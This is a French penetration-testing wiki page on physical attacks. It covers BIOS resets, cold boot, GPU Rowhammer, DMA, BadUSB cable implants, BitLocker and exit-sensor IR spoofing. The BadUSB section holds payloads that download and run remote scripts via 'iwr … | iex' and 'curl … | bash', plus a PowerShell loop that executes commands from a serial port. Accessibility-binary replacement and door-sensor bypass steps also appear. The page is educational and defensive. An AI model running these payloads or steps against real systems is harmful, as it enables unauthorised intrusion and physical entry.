# Attaques physiques

{{#include ../banners/hacktricks-training.md}}

## Récupération du mot de passe du BIOS et sécurité du système

Les paramètres des firmwares PC legacy peuvent être réinitialisés en déconnectant la pile CMOS ou en utilisant un cavalier clear-CMOS documenté. La durée nécessaire de mise hors tension dépend de la carte, et les mots de passe ou clés UEFI modernes peuvent être stockés dans une mémoire flash non volatile, un contrôleur embarqué ou un dispositif de sécurité, et donc survivre au retrait de la pile. Consultez le manuel de la carte ou de maintenance avant de court-circuiter des broches ; cette procédure peut également invalider les mesures TPM et déclencher la récupération du chiffrement du disque.

Sur les systèmes x86 legacy, des outils tels que **killCMOS** et **CmosPwd** peuvent inspecter ou modifier les paramètres sauvegardés dans le CMOS depuis un environnement amorçable. CmosPwd reconnaît les formats de mots de passe d'un ensemble documenté d'anciennes familles de BIOS et peut sauvegarder, restaurer ou effacer/tuer l'état du CMOS ; ses builds publiés ciblent les environnements DOS/Windows legacy, Linux, FreeBSD et NetBSD.<sup>[[18]](#references)</sup> Ces utilitaires ne permettent pas de supprimer génériquement les mots de passe UEFI et nécessitent un accès suffisant au matériel et au firmware.

Certains firmwares de portables affichent un code de défi spécifique au fabricant après plusieurs tentatives de mot de passe échouées. Des bases de données telles que [bios-pw.org](https://bios-pw.org) peuvent dériver des mots de passe de récupération legacy de certains fabricants pour certains modèles, mais de nombreux systèmes implémentent un verrouillage sans code de défi dérivable. Considérez tout mot de passe généré comme spécifique au modèle et évitez d'épuiser les compteurs de tentatives permanents.

### Sécurité UEFI

Pour les systèmes **UEFI** modernes, CHIPSEC peut auditer les protections des variables Secure Boot. Commencez par la vérification non modificatrice ci-dessous ; le mode facultatif `-a modify` tente délibérément de corrompre les variables et ne doit être utilisé que sur un système de laboratoire récupérable. CHIPSEC avertit lui-même que son pilote privilégié et son accès matériel de bas niveau ne sont pas adaptés aux endpoints de production.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analyse de la RAM et attaques Cold Boot

La DRAM ne perd pas chaque bit immédiatement lorsque le rafraîchissement s'arrête. Le taux de dégradation varie considérablement selon la technologie du module et la température ; le refroidissement peut préserver des données utiles bien plus longtemps qu'un cycle d'alimentation sans refroidissement. Une attaque Cold Boot redémarre rapidement vers un petit environnement d'acquisition ou transfère un module refroidi, capture la mémoire brute et reconstruit les clés cryptographiques malgré la dégradation des bits. Un utilitaire de copie de disque n'est pas automatiquement un imageur de mémoire physique, et Volatility analyse une capture au lieu de l'acquérir ; utilisez un outil d'acquisition adapté à la plateforme et validé.<sup>[[12]](#references)</sup>

---

## Rowhammer GPU contre les tables de pages

Les attaques Rowhammer GPU modernes deviennent bien plus utiles lorsqu'elles ciblent les **métadonnées de mémoire virtuelle du GPU** plutôt que des buffers ordinaires. Des travaux récents sur les **GPU NVIDIA Ampere GDDR6** montrent qu'un attaquant exécutant du code CUDA non privilégié peut créer des patterns de hammering spécifiques au GPU, utiliser le **memory massaging** pour placer les structures de pagination dans des lignes vulnérables, puis inverser des bits dans la **table de pages de dernier niveau** ou un **répertoire de pages** intermédiaire. Lorsqu'une seule entrée de traduction est corrompue, l'attaquant peut établir une primitive d'**arbitrary GPU memory read/write**, puis pivoter vers la compromission de l'hôte.<sup>[[1]](#references)[[2]](#references)</sup>

### Pattern d'exploitation

1. **Profiler les lignes pouvant être hammerées** dans la GDDR6 et créer des patterns de hammering tenant compte du rafraîchissement / non uniformes qui contournent les mitigations intégrées à la DRAM.
2. **Effectuer le memory massaging des allocations GPU** afin que le driver place les structures de traduction des pages à des emplacements physiques pouvant être hammerés au lieu de les conserver dans le pool protégé par défaut. En pratique, cela peut signifier épuiser la région de tables de pages de la mémoire basse et effectuer un spraying de grandes mappings UVM clairsemées avec des strides contrôlés.
3. **Inverser les métadonnées de traduction**, telles que les bits **PFN** ou liés à l'aperture, à l'intérieur d'une entrée de table de pages / répertoire de pages, afin que la page virtuelle contrôlée par l'attaquant se résolve vers des pages de tables de pages, de la mémoire GPU arbitraire ou des mappings système visibles par l'hôte.
4. Réutiliser le mapping forgé pour réécrire des entrées de traduction supplémentaires et obtenir une primitive d'**arbitrary GPU memory read/write** entre les contextes GPU.

### Pivot vers l'hôte et mitigations

- Avec l'**IOMMU désactivé**, les mappings forgés de l'aperture système peuvent exposer n'importe quelle **mémoire physique de l'hôte** au GPU, transformant la primitive GPU en compromission complète de l'hôte.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cible les entrées de tables de pages de dernier niveau, tandis que **GeForge** montre que la corruption d'un niveau de répertoire de pages peut être plus facile, car une seule inversion de bit peut rediriger un sous-arbre de traduction plus vaste. Ne considérez pas une seule couche de pagination comme critique pour la sécurité.<sup>[[1]](#references)[[2]](#references)</sup>
- L'**IOMMU** reste importante, car elle bloque le chemin direct vers la mémoire arbitraire de l'hôte utilisé par GDDRHammer/GeForge, mais elle ne constitue **pas une mitigation complète**. **GPUBreach** montre un pivot de seconde étape où l'attaquant corrompt des buffers CPU accessibles en écriture par le GPU et appartenant au driver, puis déclenche des bugs de memory safety du driver NVIDIA afin d'obtenir une primitive d'écriture kernel et un **root shell**, même lorsque l'IOMMU est activée.<sup>[[3]](#references)</sup>
- L'**ECC au niveau système** est une mesure de hardening pratique sur les GPU workstation/server compatibles. Les GPU grand public sans ECC offrent une surface de défense plus faible.<sup>[[4]](#references)</sup>
- Ces attaques ne sont pas purement théoriques : **GeForge** a signalé **1 171** inversions de bits sur une RTX 3060 et **202** sur une RTX A6000, ce qui a suffi à construire une chaîne fonctionnelle d'escalade de privilèges sur l'hôte.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attaques Direct Memory Access (DMA)

Pour le patching offline d'IFR/NVRAM UEFI pouvant rétrograder l'application de l'IOMMU avant le démarrage et activer une chaîne DMA Windows, voir :

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** démontre l'**acquisition et le patching de mémoire via DMA** sur des interfaces telles que FireWire et les premières configurations Thunderbolt, y compris des signatures historiques de contournement de connexion. Il n'est pas simplement « inefficace contre Windows 10 » : l'exploitabilité dépend de l'interface, du build cible, de la policy IOMMU, de l'état de verrouillage et du fait que Windows Kernel DMA Protection soit prise en charge et activée. Windows 10 version 1803 et les versions ultérieures ont introduit Kernel DMA Protection sur les plateformes compatibles, modifiant considérablement la surface d'attaque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB pour l'accès au système

Sur un volume Windows non chiffré ou déjà déverrouillé, un environnement offline peut remplacer des binaires d'accessibilité tels que **sethc.exe** ou **Utilman.exe** par **cmd.exe**, ce qui fournit une invite de commandes SYSTEM lorsque le raccourci correspondant de l'écran de connexion est exécuté. Des outils tels que **chntpw** peuvent modifier les données des comptes locaux SAM. Ces méthodes ne contournent pas un volume BitLocker verrouillé et peuvent endommager les identifiants protégés par DPAPI/EFS ; conservez des copies forensiques et des sauvegardes.

**Kon-Boot** est un outil commercial de contournement de l'authentification au démarrage pour certaines configurations Windows/macOS prises en charge. La compatibilité dépend de l'OS, du mode firmware, de Secure Boot et de la configuration du chiffrement du disque ; il ne déchiffre pas un volume verrouillé par BitLocker.<sup>[[10]](#references)</sup>

---

## Gestion des fonctionnalités de sécurité Windows

### Raccourcis de démarrage et de récupération

- **Delete/Supr**, F2, F10 ou une autre touche du fabricant peut ouvrir la configuration du firmware.
- **F8** ouvre les options avancées de démarrage Windows legacy uniquement sur les configurations où cette voie reste activée ; l'accès actuel à la récupération varie.
- Maintenir **Shift** peut empêcher l'ouverture de session automatique de Windows dans certaines configurations, bien que les paramètres de policy/registre puissent désactiver ce comportement.<sup>[[17]](#references)</sup>

### Dispositifs BAD USB

Des dispositifs tels que **USB Rubber Ducky** et les cartes Teensy peuvent s'énumérer comme des claviers HID de confiance et injecter des frappes prédéfinies. Le payload possède initialement les privilèges et l'accès au desktop de la session ouverte ; les invites UAC, le verrouillage de l'écran, la disposition du clavier, le timing et la policy USB de l'endpoint continuent de le limiter.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Les privilèges d'administrateur ou de backup peuvent créer une shadow copy ou enregistrer les ruches du registre afin que des fichiers verrouillés tels que **SAM** et **SYSTEM** puissent être acquis. Il s'agit d'une technique de collecte post-compromission, et non d'un contournement de privilèges ; elle doit être corrélée aux événements `diskshadow`/VSS et d'exportation de ruches du registre.

## Techniques d'implant BadUSB / HID

### Implants de câbles gérés par Wi-Fi

- Les implants basés sur ESP32-S3 tels que **Evil Crow Cable Wind** se dissimulent dans des câbles USB-A→USB-C ou USB-C↔USB-C, s'énumèrent uniquement comme un clavier USB et exposent leur stack C2 via Wi-Fi. L'opérateur doit seulement alimenter le câble depuis l'hôte victime, créer un hotspot nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, puis accéder à [http://cable-wind.local/](http://cable-wind.local/) (ou à son adresse DHCP) pour atteindre l'interface HTTP embarquée.<sup>[[8]](#references)</sup>
- L'interface du navigateur fournit des onglets *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* et *Config*. Les payloads stockés sont étiquetés par OS, les dispositions de clavier sont modifiées à la volée et les chaînes VID/PID peuvent être altérées pour imiter des périphériques connus.
- Comme le C2 se trouve à l'intérieur du câble, un téléphone peut préparer les payloads, déclencher leur exécution et gérer les identifiants Wi-Fi sans utiliser le réseau de l'organisation — ce qui est utile pour les intrusions physiques de courte durée.

### Payloads AutoExec tenant compte de l'OS

- Les règles AutoExec associent un ou plusieurs payloads afin de les exécuter immédiatement après l'énumération USB. L'implant effectue un fingerprinting léger de l'OS et sélectionne le script correspondant.
- Exemple de workflow :
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Comme l'exécution est automatisée, le simple remplacement d'un câble de recharge peut permettre un accès initial « plug-and-pwn » dans le contexte de l'utilisateur connecté.

### Remote shell amorcé par HID via Wi-Fi TCP

1. **Amorçage par frappes clavier :** un payload stocké ouvre une console et colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Une variante Windows minimale est :
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** L’implant maintient le canal USB CDC ouvert pendant que son ESP32-S3 lance un client TCP (script Python, APK Android ou exécutable desktop) vers l’opérateur. Les octets saisis dans la session TCP sont transférés dans la boucle série ci-dessus, ce qui permet l’exécution de commandes à distance même sur des hôtes isolés. La sortie est limitée ; les opérateurs exécutent donc généralement des commandes à l’aveugle (création de comptes, staging d’outils supplémentaires, etc.).

### Surface de mise à jour HTTP OTA

- L’interface documentée d’Evil Crow Cable expose un endpoint de mise à jour du firmware non authentifié à l’adresse `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Les opérateurs sur le terrain peuvent hot-swap des fonctionnalités (par ex. flasher le firmware de USB Army Knife) en cours d'engagement sans ouvrir le câble, permettant à l'implant de basculer vers de nouvelles capacités tout en restant branché à l'hôte cible.

## Contourner le chiffrement BitLocker

Une acquisition forensique autorisée d'un système actif ou récemment utilisé peut contenir une clé maître de volume BitLocker ou du matériel de clé associé lorsque le volume est déverrouillé. Des outils commerciaux tels qu'Elcomsoft Forensic Disk Decryptor et Passware Kit Forensic peuvent rechercher ces éléments dans des images mémoire, des fichiers d'hibernation ou des crash dumps pris en charge, mais le succès n'est pas garanti. Les versions modernes de Windows chiffrent également les crash dumps lorsque BitLocker est activé, et un mot de passe de récupération de 48 chiffres enregistré constitue un artefact différent d'une clé de volume présente en mémoire.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingénierie sociale pour ajouter une clé de récupération

Un attaquant qui persuade un administrateur d'exécuter des commandes de gestion BitLocker peut ajouter un recovery-password, une clé externe ou un autre protecteur, puis le récupérer. Un recovery password ne peut pas être une chaîne arbitraire de zéros : les mots de passe de récupération numériques BitLocker ont un format validé de 48 chiffres. La syntaxe d'administration autorisée correspondante est `manage-bde -protectors -add C: -recoverypassword` ; listez les protecteurs ainsi ajoutés avec `manage-bde -protectors -get C:`. Surveillez l'ajout de protecteurs et assurez-vous que tout nouveau matériel de récupération est placé uniquement dans des emplacements approuvés.<sup>[[16]](#references)</sup>

---

## Exploiter les commutateurs d'intrusion du châssis / de maintenance pour réinitialiser le BIOS aux paramètres d'usine

De nombreux laptops modernes et ordinateurs de bureau compacts intègrent un **chassis-intrusion switch** surveillé par l'Embedded Controller (EC) et le firmware BIOS/UEFI. Bien que le rôle principal de ce commutateur soit de déclencher une alerte lorsqu'un appareil est ouvert, certains fabricants implémentent parfois un **raccourci de récupération non documenté** qui se déclenche lorsque le commutateur est actionné selon une séquence précise.<sup>[[5]](#references)[[6]](#references)</sup>

### Fonctionnement de l'attaque

1. Le commutateur est relié à une **interruption GPIO** sur l'EC.
2. Le firmware exécuté sur l'EC mémorise le **moment et le nombre d'appuis**.
3. Lorsqu'une séquence codée en dur est reconnue, l'EC appelle une routine de *mainboard-reset* qui **efface le contenu de la NVRAM/CMOS du système**.
4. Au démarrage suivant, les modèles concernés chargent un état de firmware réinitialisé. Selon le fabricant et la révision, l'état effacé peut inclure un mot de passe superviseur, des paramètres de démarrage personnalisés ou des clés Secure Boot enregistrées ; l'état du TPM et les effets sur le chiffrement du disque doivent être évalués séparément.

> Une réinitialisation du firmware peut restaurer les options de démarrage externe, mais elle ne **déchiffre** pas le stockage. BitLocker ou un autre système de chiffrement intégral du disque peut passer en mode de récupération après des modifications du TPM/firmware et continuer à protéger le disque interne sans clé de récupération.<sup>[[16]](#references)</sup>

### Exemple concret – laptop Framework 13

Le raccourci de récupération du Framework 13 (11e/12e/13e génération) est :
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Après le dixième cycle, l’EC définit un indicateur qui demande au BIOS d’effacer la NVRAM au prochain redémarrage. Toute la procédure prend environ 40 s et ne nécessite **rien d’autre qu’un tournevis**.<sup>[[5]](#references)</sup>

### Procédure d’exploitation générique

1. Allumez la cible ou effectuez une reprise après suspension afin que l’EC soit en fonctionnement.
2. Retirez le capot inférieur pour accéder au commutateur d’intrusion/maintenance.
3. Reproduisez la séquence de basculement spécifique au fabricant (consultez la documentation ou les forums, ou procédez à la rétro-ingénierie du firmware de l’EC).
4. Remontez l’appareil et redémarrez-le, puis vérifiez quels paramètres du firmware et identifiants ont effectivement changé.
5. Si vous y êtes autorisé et qu’un démarrage externe est disponible, démarrez une image live contrôlée. Une fois qu’un volume interne est légitimement déverrouillé (ou s’il n’a jamais été chiffré), l’environnement live peut récupérer des identifiants et des données, ou inspecter l’EFI System Partition. Modifier cette partition pour installer un implant EFI est persistant et très intrusif, et reste limité par Secure Boot, le measured boot, la protection contre l’écriture du firmware et la surveillance des endpoints. Le stockage chiffré reste inaccessible sans sa clé ou ses éléments de récupération.

### Détection et atténuation

* Consignez les événements d’intrusion du châssis dans la console de gestion de l’OS et corrélez-les avec les réinitialisations inattendues du BIOS.
* Utilisez des **scellés inviolables** sur les vis et les capots afin de détecter toute ouverture.
* Conservez les appareils dans des **zones physiquement contrôlées** ; partez du principe que l’accès physique équivaut à une compromission totale.
* Lorsque cette option est disponible, désactivez la fonctionnalité « maintenance switch reset » du fabricant ou exigez une autorisation cryptographique supplémentaire pour les réinitialisations de la NVRAM.

---

## Injection IR furtive contre les capteurs de sortie No-Touch

### Caractéristiques du capteur
- Les capteurs « wave-to-exit » courants associent un émetteur LED proche infrarouge à un module récepteur de type télécommande TV qui ne signale un niveau logique haut qu’après avoir détecté plusieurs impulsions (environ 4 à 10) de la porteuse appropriée (environ 30 kHz).<sup>[[7]](#references)</sup>
- Un carénage en plastique empêche l’émetteur et le récepteur de se regarder directement ; le contrôleur suppose donc que toute porteuse validée provient d’une réflexion proche et commande un relais qui ouvre la gâche de la porte.
- Une fois que le contrôleur pense qu’une cible est présente, il modifie souvent l’enveloppe de modulation sortante, mais le récepteur continue d’accepter toute salve correspondant à la porteuse filtrée.

### Déroulement de l’attaque
1. **Capturer le profil d’émission** – branchez un analyseur logique sur les broches du contrôleur afin d’enregistrer les formes d’onde pré-détection et post-détection qui pilotent la LED IR interne.
2. **Relire uniquement la forme d’onde « post-détection »** – retirez ou ignorez l’émetteur d’origine et pilotez une LED IR externe avec le motif déjà déclenché dès le départ. Comme le récepteur ne s’intéresse qu’au nombre d’impulsions et à la fréquence, il traite la porteuse usurpée comme une réflexion authentique et active la ligne du relais.
3. **Contrôler la transmission** – émettez la porteuse en salves réglées (par exemple, quelques dizaines de millisecondes d’émission suivies d’une durée similaire d’arrêt) afin de fournir le nombre minimal d’impulsions sans saturer l’AGC du récepteur ni sa logique de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le déclenchement du relais.

### Injection réflective à longue portée
- Remplacer la LED de banc par une diode IR haute puissance, un driver MOSFET et une optique de focalisation permet un déclenchement fiable depuis environ 6 m.
- L’attaquant n’a pas besoin d’une ligne de visée directe vers l’ouverture du récepteur ; il peut orienter le faisceau vers les murs intérieurs, les étagères ou les encadrements de porte visibles à travers une vitre, afin que l’énergie réfléchie entre dans le champ de vision d’environ 30° et imite le mouvement d’une main à courte portée.
- Comme les récepteurs ne s’attendent qu’à de faibles réflexions, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces tout en restant au-dessus du seuil de détection.

### Torche d’attaque weaponisée
- Intégrer le driver dans une lampe de poche commerciale dissimule l’outil à la vue de tous. Remplacez la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajoutez un ATtiny412 (ou un composant similaire) pour générer les salves d’environ 30 kHz, puis utilisez un MOSFET pour absorber le courant de la LED.
- Une lentille de zoom télescopique resserre le faisceau pour améliorer la portée et la précision, tandis qu’un moteur vibratoire contrôlé par le MCU fournit une confirmation haptique de l’activation de la modulation sans émettre de lumière visible.
- Alterner entre plusieurs motifs de modulation enregistrés (avec des fréquences de porteuse et des enveloppes légèrement différentes) augmente la compatibilité entre les familles de capteurs rebadgés et permet à l’opérateur de balayer les surfaces réfléchissantes jusqu’à entendre le relais cliquer et la porte s’ouvrir.

---

## References

- [1] [GDDRHammer : perturbation importante des lignes DRAM — attaques Rowhammer inter-composants depuis des GPU modernes](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge : marteler la mémoire GDDR pour forger les tables de pages des GPU, pour le plaisir et le profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach : attaques d’élévation de privilèges contre les GPU utilisant Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avis de sécurité : Rowhammer - juillet 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – « Framework 13. Appuyez ici pour pwn »](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guide de réinitialisation de la carte mère](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – « Noooooooo Touch! – Contourner les capteurs de sortie IR No-Touch avec une torche IR furtive »](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – « Plug, Play, Pwn : Hacking avec Evil Crow Cable Wind »](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - attaque Rowhammer contre les puces NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentation officielle de Kon-Boot et informations de compatibilité](https://kon-boot.com/)
- [11] [Documentation de CHIPSEC - protections des variables Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Pour que nous n’oubliions pas : attaques cold boot contre les clés de chiffrement](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulation de la mémoire physique via DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - protection Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentation de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - guide des opérations BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - maintien de la touche Shift et comportement de l’ouverture de session automatique](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - documentation et téléchargements de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
